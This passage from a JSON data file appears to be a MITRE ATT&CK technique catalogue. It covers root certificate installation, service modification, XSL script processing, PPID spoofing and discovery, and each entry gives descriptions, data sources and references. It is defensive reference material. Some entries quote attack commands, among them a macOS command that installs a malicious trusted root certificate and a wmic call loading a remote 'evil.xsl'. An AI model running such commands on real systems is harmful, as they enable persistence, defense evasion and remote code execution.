      "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
      "meta": {
        "external_id": "CAPEC-479",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "SSL/TLS inspection",
          "Digital certificate logs"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1130",
          "https://capec.mitre.org/data/definitions/479.html",
          "https://en.wikipedia.org/wiki/Root_certificate",
          "http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-finding-holes-operation-emmental.pdf",
          "https://www.kaspersky.com/blog/lenovo-pc-with-adware-superfish-preinstalled/7712/",
          "https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec",
          "https://objective-see.com/blog/blog_0x26.html",
          "https://docs.microsoft.com/sysinternals/downloads/sigcheck",
          "https://www.tripwire.com/state-of-security/off-topic/appunblocker-bypassing-applocker/"
        ]
      },
      "uuid": "d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
      "value": "Install Root Certificate - T1130"
    },
    {
      "description": "Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Registry. Service configurations can be modified using utilities such as sc.exe and [Reg](https://attack.mitre.org/software/S0075).\n\nAdversaries can modify an existing service to persist malware on a system by using system utilities or by using custom tools to interact with the Windows API. Use of existing services is a type of [Masquerading](https://attack.mitre.org/techniques/T1036) that may make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.\n\nAdversaries may also intentionally corrupt or kill services to execute malicious recovery programs/commands. (Citation: Twitter Service Recovery Nov 2017) (Citation: Microsoft Service Recovery Feb 2013)",
      "meta": {
        "external_id": "CAPEC-551",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "Windows Registry",
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1031",
          "https://capec.mitre.org/data/definitions/551.html",
          "https://twitter.com/r0wdy_/status/936365549553991680",
          "https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)",
          "https://technet.microsoft.com/en-us/sysinternals/bb963902"
        ]
      },
      "uuid": "62dfd1ca-52d5-483c-a84b-d6e80bf94b7b",
      "value": "Modify Existing Service - T1031"
    },
    {
      "description": "Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as [FTP](https://attack.mitre.org/software/S0095). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\n\nAdversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076).",
      "meta": {
        "external_id": "T1105",
        "kill_chain": [
          "mitre-attack:command-and-control",
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Packet capture",
          "Process use of network",
          "Netflow/Enclave netflow",
          "Network protocol analysis",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1105",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "e6919abc-99f9-4c6c-95a5-14761e7b2add",
      "value": "Remote File Copy - T1105"
    },
    {
      "description": "Adversary tools may directly use the Windows application programming interface (API) to execute binaries. Functions such as the Windows API CreateProcess will allow programs and scripts to start other processes with proper path and argument parameters. (Citation: Microsoft CreateProcess)\n\nAdditional Windows API calls that can be used to execute binaries include: (Citation: Kanthak Verifier)\n\n* CreateProcessA() and CreateProcessW(),\n* CreateProcessAsUserA() and CreateProcessAsUserW(),\n* CreateProcessInternalA() and CreateProcessInternalW(),\n* CreateProcessWithLogonW(), CreateProcessWithTokenW(),\n* LoadLibraryA() and LoadLibraryW(),\n* LoadLibraryExA() and LoadLibraryExW(),\n* LoadModule(),\n* LoadPackagedLibrary(),\n* WinExec(),\n* ShellExecuteA() and ShellExecuteW(),\n* ShellExecuteExA() and ShellExecuteExW()",
      "meta": {
        "external_id": "T1106",
        "kill_chain": [
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1106",
          "http://msdn.microsoft.com/en-us/library/ms682425",
          "https://skanthak.homepage.t-online.de/verifier.html"
        ]
      },
      "uuid": "391d824f-0ef1-47a0-b0ee-c59a75e27670",
      "value": "Execution through API - T1106"
    },
    {
      "description": "The Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076), instead of through a [Command-Line Interface](https://attack.mitre.org/techniques/T1059), to search for information and execute files via mouse double-click events, the Windows Run command (Citation: Wikipedia Run Command), or other potentially difficult to monitor interactions.",
      "meta": {
        "external_id": "T1061",
        "kill_chain": [
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters",
          "Binary file metadata"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1061",
          "https://en.wikipedia.org/wiki/Run_command"
        ]
      },
      "uuid": "a6525aec-acc4-47fe-92f9-b9b4de4b9228",
      "value": "Graphical User Interface - T1061"
    },
    {
      "description": "Adversaries may deploy malicious software to systems within a network using application deployment systems employed by enterprise administrators. The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.\n\nAccess to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.",
      "meta": {
        "external_id": "CAPEC-187",
        "kill_chain": [
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process use of network",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1017",
          "https://capec.mitre.org/data/definitions/187.html"
        ]
      },
      "uuid": "327f3cc5-eea1-42d4-a6cd-ed34b7ce8f61",
      "value": "Application Deployment Software - T1017"
    },
    {
      "description": "Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP)\n\nIn cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. (Citation: Specter Ops - Cloud Credential Storage)\n\n",
      "meta": {
        "external_id": "CAPEC-639",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows",
          "AWS",
          "GCP",
          "Azure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1081",
          "https://capec.mitre.org/data/definitions/639.html",
          "http://carnal0wnage.attackresearch.com/2014/05/mimikatz-against-virtual-machine-memory.html",
          "http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx",
          "https://posts.specterops.io/head-in-the-clouds-bd038bb69e48"
        ]
      },
      "uuid": "ba8e391f-14b5-496f-81f2-2d5ecd646c1c",
      "value": "Credentials in Files - T1081"
    },
    {
      "description": "Adversaries will likely attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used. Adversaries may also use local host files in order to discover the hostname to IP address mappings of remote systems. \n\n### Windows\n\nExamples of tools and commands that acquire this information include \"ping\" or \"net view\" using [Net](https://attack.mitre.org/software/S0039). The contents of the <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> file can be viewed to gain insight into the existing hostname to IP mappings on the system.\n\n### Mac\n\nSpecific to Mac, the <code>bonjour</code> protocol to discover additional Mac-based systems within the same broadcast domain. Utilities such as \"ping\" and others can be used to gather information about remote systems. The contents of the <code>/etc/hosts</code> file can be viewed to gain insight into existing hostname to IP mappings on the system.\n\n### Linux\n\nUtilities such as \"ping\" and others can be used to gather information about remote systems. The contents of the <code>/etc/hosts</code> file can be viewed to gain insight into existing hostname to IP mappings on the system.\n\n### Cloud\n\nIn cloud environments, the above techniques may be used to discover remote systems depending upon the host operating system. In addition, cloud environments often provide APIs with information about remote systems and services.\n",
      "meta": {
        "external_id": "CAPEC-292",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Network protocol analysis",
          "Process monitoring",
          "Process use of network",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows",
          "GCP",
          "Azure",
          "AWS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1018",
          "https://capec.mitre.org/data/definitions/292.html"
        ]
      },
      "uuid": "e358d692-23c0-4a31-9eb6-ecc13a8d7735",
      "value": "Remote System Discovery - T1018"
    },
    {
      "description": "Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command-Line Interface](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\n\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",
      "meta": {
        "external_id": "T1202",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters",
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1202",
          "https://twitter.com/vector_sec/status/896049052642533376",
          "https://twitter.com/Evi1cg/status/935027922397573120",
          "https://community.rsa.com/community/products/netwitness/blog/2017/08/14/are-you-looking-out-for-forfilesexe-if-you-are-watching-for-cmdexe"
        ]
      },
      "uuid": "3b0e52ce-517a-4614-a523-1bd5deef6c5e",
      "value": "Indirect Command Execution - T1202"
    },
    {
      "description": "Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to [Trusted Developer Utilities](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>",
      "meta": {
        "external_id": "T1220",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters",
          "Process use of network",
          "DLL monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1220",
          "https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script",
          "https://www.microsoft.com/download/details.aspx?id=21714",
          "https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/",
          "https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/",
          "https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75",
          "https://lolbas-project.github.io/lolbas/Binaries/Wmic/",
          "https://twitter.com/dez_/status/986614411711442944"
        ]
      },
      "uuid": "ebbe170d-aa74-4946-8511-9921243415a3",
      "value": "XSL Script Processing - T1220"
    },
    {
      "description": "Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.",
      "meta": {
        "external_id": "T1032",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Packet capture",
          "Netflow/Enclave netflow",
          "Malware reverse engineering",
          "Process use of network",
          "Process monitoring",
          "SSL/TLS inspection"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1032",
          "http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840",
          "https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html",
          "https://www.fidelissecurity.com/sites/default/files/FTA_1018_looking_at_the_sky_for_a_dark_comet.pdf",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "4b74a1d4-b0e9-4ef1-93f1-14ecc6e2f5b5",
      "value": "Standard Cryptographic Protocol - T1032"
    },
    {
      "description": "Leadership or key decision makers may derive specific intelligence requirements from Key Intelligence Topics (KITs) or Key Intelligence Questions (KIQs).  Specific intelligence requirements assist analysts in gathering information to establish a baseline of information about a topic or question and collection managers to clarify the types of information that should be collected to satisfy the requirement. (Citation: LowenthalCh4) (Citation: Heffter)",
      "meta": {
        "external_id": "T1230",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-planning"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1230"
        ]
      },
      "uuid": "15d5eaa4-597a-47fd-a692-f2bed434d904",
      "value": "Derive intelligence requirements - T1230"
    },
    {
      "description": "Adversaries may use a custom cryptographic protocol or algorithm to hide command and control traffic. A simple scheme, such as XOR-ing the plaintext with a fixed key, will produce a very weak ciphertext.\n\nCustom encryption schemes may vary in sophistication. Analysis and reverse engineering of malware samples may be enough to discover the algorithm and encryption key used.\n\nSome adversaries may also attempt to implement their own version of a well-known cryptographic algorithm instead of using a known implementation library, which may lead to unintentional errors. (Citation: F-Secure Cosmicduke)",
      "meta": {
        "external_id": "T1024",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Packet capture",
          "Netflow/Enclave netflow",
          "Process use of network",
          "Malware reverse engineering",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1024",
          "https://www.f-secure.com/documents/996508/1030745/cosmicduke_whitepaper.pdf",
          "https://www.fidelissecurity.com/sites/default/files/FTA_1018_looking_at_the_sky_for_a_dark_comet.pdf",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "3b3cbbe0-6ed3-4334-b543-3ddfd8c5642d",
      "value": "Custom Cryptographic Protocol - T1024"
    },
    {
      "description": "Adversaries may use [Domain Generation Algorithms](https://attack.mitre.org/techniques/T1520) (DGAs) to procedurally generate domain names for command and control communication, and other uses such as malicious application distribution.(Citation: securelist rotexy 2018)\n\nDGAs increase the difficulty for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.",
      "meta": {
        "external_id": "T1520",
        "kill_chain": [
          "mitre-mobile-attack:command-and-control"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1520",
          "https://securelist.com/the-rotexy-mobile-trojan-banker-and-ransomware/88893/",
          "https://datadrivensecurity.info/blog/posts/2014/Oct/dga-part2/"
        ]
      },
      "uuid": "60623164-ccd8-4508-a141-b5a34820b3de",
      "value": "Domain Generation Algorithms - T1520"
    },
    {
      "description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1086)/[Rundll32](https://attack.mitre.org/techniques/T1085) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via VBA [Scripting](https://attack.mitre.org/techniques/T1064) within a malicious Office document or any code that can perform [Execution through API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)\n\nExplicitly assigning the PPID may also enable [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) (given appropriate access rights to the parent process). For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)",
      "meta": {
        "external_id": "T1502",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "Windows event logs",
          "Process monitoring",
          "API monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1502",
          "https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/",
          "https://docs.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works",
          "https://www.countercept.com/blog/detecting-parent-pid-spoofing/",
          "https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/",
          "https://blog.xpnsec.com/becoming-system/",
          "https://docs.microsoft.com/windows/desktop/ProcThread/process-creation-flags",
          "https://www.securityinbits.com/malware-analysis/parent-pid-spoofing-stage-2-ataware-ransomware-part-3"
        ]
      },
      "uuid": "9ddc2534-e91c-4dab-a8f6-43dab81e8142",
      "value": "Parent PID Spoofing - T1502"
    },
    {
      "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Windows\n\nExample commands and utilities that obtain this information include <code>ver</code>, [Systeminfo](https://attack.mitre.org/software/S0096), and <code>dir</code> within [cmd](https://attack.mitre.org/software/S0106) for identifying information based on present files and directories.\n\n### Mac\n\nOn Mac, the <code>systemsetup</code> command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the <code>system_profiler</code> gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions.\n\n### AWS\n\nIn Amazon Web Services (AWS), the Application Discovery Service may be used by an adversary to identify servers, virtual machines, software, and software dependencies running.(Citation: Amazon System Discovery)\n\n### GCP\n\nOn Google Cloud Platform (GCP) <code>GET /v1beta1/{parent=organizations/*}/assets</code> or <code>POST /v1beta1/{parent=organizations/*}/assets:runDiscovery</code> may be used to list an organizations cloud assets, or perform asset discovery on a cloud environment.(Citation: Google Command Center Dashboard)\n\n### Azure\n\nIn Azure, the API request <code>GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Compute/virtualMachines/{vmName}?api-version=2019-03-01</code> may be used to retrieve information about the model or instance view of a virtual machine.(Citation: Microsoft Virutal Machine API)",
      "meta": {
        "external_id": "CAPEC-312",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Azure activity logs",
          "Stackdriver logs",
          "AWS CloudTrail logs",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows",
          "AWS",
          "GCP",
          "Azure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1082",
          "https://capec.mitre.org/data/definitions/312.html",
          "https://docs.aws.amazon.com/en_pv/application-discovery/latest/userguide/what-is-appdiscovery.html",
          "https://cloud.google.com/security-command-center/docs/quickstart-scc-dashboard",
          "https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get"
        ]
      },
      "uuid": "354a7f88-63fb-41b5-a801-ce3b377b36f1",
      "value": "System Information Discovery - T1082"
    },
    {
      "description": "Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). (Citation: Microsoft WinRM) It may be called with the <code>winrm</code> command or by any number of programs such as PowerShell. (Citation: Jacobsen 2014)",
      "meta": {
        "external_id": "CAPEC-555",
        "kill_chain": [
          "mitre-attack:execution",
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Authentication logs",
          "Netflow/Enclave netflow",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1028",
          "https://capec.mitre.org/data/definitions/555.html",
          "http://msdn.microsoft.com/en-us/library/aa384426",
          "https://www.slideshare.net/kieranjacobsen/lateral-movement-with-power-shell-2",
          "https://medium.com/threatpunter/detecting-lateral-movement-using-sysmon-and-splunk-318d3be141bc"
        ]
      },
      "uuid": "c3bce4f4-9795-46c6-976e-8676300bbc39",
      "value": "Windows Remote Management - T1028"
    },
    {
      "description": "Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n\n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)",
      "meta": {
        "external_id": "T1043",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Packet capture",
          "Netflow/Enclave netflow",
          "Process use of network",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1043",
          "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
        ]
      },
      "uuid": "f879d51c-5476-431c-aedf-f14d207e4d1e",
      "value": "Commonly Used Port - T1043"
    },
    {
      "description": "Every domain registrar maintains a publicly viewable database that displays contact information for every registered domain. Private 'whois' services display alternative information, such as their own company data, rather than the owner of the domain. (Citation: APT1)",
      "meta": {
        "external_id": "T1305",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1305"
        ]
      },
      "uuid": "3160347f-11ac-44a3-9640-a648b3c17a8f",
      "value": "Private whois services - T1305"
    },
    {
      "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1063) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n\n### Windows\n\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.\n\n### Mac\n\nIt's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.",
      "meta": {
        "external_id": "T1063",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1063"
        ]
      },
      "uuid": "241814ae-de3f-4656-b49e-f9a80764d4b7",
      "value": "Security Software Discovery - T1063"
    },
    {
      "description": "An  adversary can test physical access options in preparation for the actual attack. This could range from observing behaviors and noting security precautions to actually attempting access. (Citation: OCIAC Pre Incident Indicators) (Citation: NewsAgencySpy)",
      "meta": {
        "external_id": "T1360",
        "kill_chain": [
          "mitre-pre-attack:test-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1360"
        ]
      },
      "uuid": "18bfa01c-9fa9-409f-91f5-4a2822609d81",
      "value": "Test physical access - T1360"
    },
    {
      "description": "A malicious app can exploit unpatched vulnerabilities in the operating system to obtain escalated privileges.",
      "meta": {
        "external_id": "APP-26",
        "kill_chain": [
          "mitre-mobile-attack:privilege-escalation"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1404",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-26.html"
        ]
      },
      "uuid": "351c0927-2fc1-4a2c-ad84-cbbee7eb8172",
      "value": "Exploit OS Vulnerability - T1404"
    },
    {
      "description": "A malicious app or other attack vector could be used to exploit vulnerabilities in code running within the Trusted Execution Environment (TEE) (Citation: Thomas-TrustZone). The adversary could then obtain privileges held by the TEE potentially including the ability to access cryptographic keys or other sensitive data (Citation: QualcommKeyMaster). Escalated operating system privileges may be first required in order to have the ability to attack the TEE (Citation: EkbergTEE). If not, privileges within the TEE can potentially be used to exploit the operating system (Citation: laginimaineb-TEE).",
      "meta": {
        "external_id": "APP-27",
        "kill_chain": [
          "mitre-mobile-attack:credential-access",
          "mitre-mobile-attack:privilege-escalation"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1405",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-27.html",
          "https://usmile.at/symposium/program/2015/thomas-holmes",
          "https://bits-please.blogspot.in/2016/06/extracting-qualcomms-keymaster-keys.html",
